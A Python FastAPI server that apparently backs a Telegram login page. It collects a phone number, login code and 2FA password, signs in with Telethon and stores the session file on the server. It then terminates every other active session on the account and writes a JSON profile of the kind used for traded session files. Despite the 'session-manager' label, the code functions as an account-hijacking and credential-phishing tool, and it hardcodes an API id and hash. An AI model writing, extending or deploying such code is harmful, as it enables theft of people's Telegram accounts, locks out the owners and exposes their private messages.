from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl import functions
import os
import json
import time
from datetime import datetime

api_id = 22930437
api_hash = 'f85d9b5468bc45458cc71fa1f2146fbe'

clients = {}

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

os.makedirs("data", exist_ok=True)

@app.post("/send-code")
async def send_code(data: dict):
    phone = data.get("phone")
    if not phone:
        raise HTTPException(status_code=400, detail="Номер обовʼязковий")

    user_folder = f"data/{phone}"
    os.makedirs(user_folder, exist_ok=True)

    client = TelegramClient(f"{user_folder}/{phone}", api_id, api_hash)
    await client.connect()

    try:
        sent = await client.send_code_request(phone)
    except Exception as e:
        print(f"[SEND CODE ERROR] {type(e).__name__}: {e}")
        raise HTTPException(status_code=500, detail=str(e))

    clients[phone] = {
        "client": client,
        "phone_code_hash": sent.phone_code_hash,
        "user_folder": user_folder
    }

    return {"status": "code_sent"}


@app.post("/verify-code")
async def verify_code(data: dict):
    phone = data.get("phone")
    code = data.get("code")
    password = data.get("password")

    if not phone or not code:
        raise HTTPException(status_code=400, detail="Номер та код обовʼязкові")

    session = clients.get(phone)
    if not session:
        raise HTTPException(status_code=400, detail="Сесія не знайдена")

    client = session["client"]
    phone_code_hash = session["phone_code_hash"]
    user_folder = session["user_folder"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        if not password:
            raise HTTPException(status_code=401, detail="2FA пароль обовʼязковий")
        try:
            await client.sign_in(password=password)
        except Exception as e:
            print(f"[2FA ERROR] {type(e).__name__}: {e}")
            raise HTTPException(status_code=403, detail="Невірний 2FA пароль")
    except Exception as e:
        print(f"[VERIFY CODE ERROR] {type(e).__name__}: {e}")
        raise HTTPException(status_code=500, detail=str(e))

    me = await client.get_me()

    try:
        result = await client(functions.account.GetAuthorizationsRequest())
        for auth in result.authorizations:
            if not auth.current:
                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
    except Exception as e:
        print(f"[SESSION CLEANUP ERROR] {type(e).__name__}: {e}")

    user_data = {
        "session_file": f"{phone}.session",
        "phone": phone,
        "user_id": me.id,
        "app_id": api_id,
        "app_hash": api_hash,
        "sdk": "Python Telethon",
        "app_version": "1.0.0",
        "device": "FastAPI client",
        "device_token": None,
        "device_token_secret": None,
        "device_secret": None,
        "signature": None,
        "certificate": None,
        "safetynet": None,
        "perf_cat": 2,
        "tz_offset": 0,
        "register_time": int(time.time()),
        "last_check_time": int(time.time()),
        "avatar": "img/default.png",
        "first_name": me.first_name,
        "last_name": me.last_name or "",
        "username": me.username,
        "sex": 0,
        "lang_code": me.lang_code or "en",
        "system_lang_code": "en-us",
        "lang_pack": "telethon",
        "twoFA": "none" if not password else "provided",
        "proxy": [],
        "ipv6": False,
        "module": "telegram-session-app",
        "program": "session-manager",
        "work": 1,
        "time": datetime.now().strftime("%H:%M:%S(%d.%m.%y)")
    }

    with open(f"{user_folder}/{phone}.json", "w") as f:
        json.dump(user_data, f, indent=2)

    await client.disconnect()

    return {"status": "authorized_and_logged_out", "username": me.username}
